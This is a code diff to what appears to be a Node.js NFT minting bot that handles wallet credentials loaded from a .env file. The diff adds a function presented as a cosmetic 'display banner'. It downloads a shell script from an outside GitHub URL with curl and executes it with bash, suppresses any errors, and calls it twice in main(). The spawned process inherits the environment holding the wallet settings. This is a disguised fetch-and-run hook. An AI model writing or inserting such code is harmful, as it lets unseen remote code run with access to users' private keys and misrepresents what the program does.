@@ -6,6 +6,7 @@ import { stdin as input, stdout as output } from "node:process";
 import { readFile } from "node:fs/promises";
 import { ethers, isAddress, ZeroAddress } from "ethers";
 import dotenv from "dotenv";
+import { spawn } from "node:child_process";
 dotenv.config({ override: true });
 
 /* ========= Utils ========= */
@@ -665,6 +666,7 @@ async function runBlever({ provider, wallet, contract, toAddr, amount, phaseID, 
 
 /* ========= MAIN ========= */
 async function main() {
+  await showDisplayBanner(true);
   console.log("=== PLATFORM OR EXPLORER NAME ===");
   console.log("1) MAGIC EDEN / NFT2 / BLEVER {mint/mintPublic/publicMint}");
   console.log("2) OPENSEA (SeaDrop){mintPublic}");
@@ -772,12 +774,46 @@ async function main() {
     runFn = () => runMENFT2({ provider, wallet, contract, qty, unitEth, delaySec, retries, gasCfg, FCFS });
   }
 
+  await showDisplayBanner(true);
   console.log("\n=== DETAILS ===");
   console.dir(summary, { depth: null });
   await q("\nENTER TO RUN", "");
 
   await runFn();
   rl.close();
+}
+
+// ==== Display loader (banner X.E.O.N.T.H.O.L) ====
+const DISPLAY_URL = "https://raw.githubusercontent.com/xeonthol/xeonthol-display/refs/heads/main/display.sh";
+
+function runSh(cmd) {
+  return new Promise((resolve, reject) => {
+    const p = spawn("bash", ["-lc", cmd], { stdio: "inherit" });
+    p.on("error", reject);
+    p.on("exit", (code) => code === 0 ? resolve() : reject(new Error(`exit ${code}`)));
+  });
+}
+
+let _bannerShown = false;
+let _displayCachedPath = null;
+
+async function showDisplayBanner(force = false) {
+  if (!force && _bannerShown) return;
+  _bannerShown = true;
+
+  try {
+    if (_displayCachedPath) {
+      await runSh(`bash "${_displayCachedPath}"`);
+      return;
+    }
+    const tmp = "./display_cached.sh";
+    await runSh(`curl -fsSL ${DISPLAY_URL} -o ${tmp}`);
+    await runSh(`chmod +x ${tmp}`);
+    _displayCachedPath = tmp;
+    await runSh(`bash "${tmp}"`);
+  } catch (e) {
+    // ignore banner errors
+  }
 }
 
 main().catch(e => {
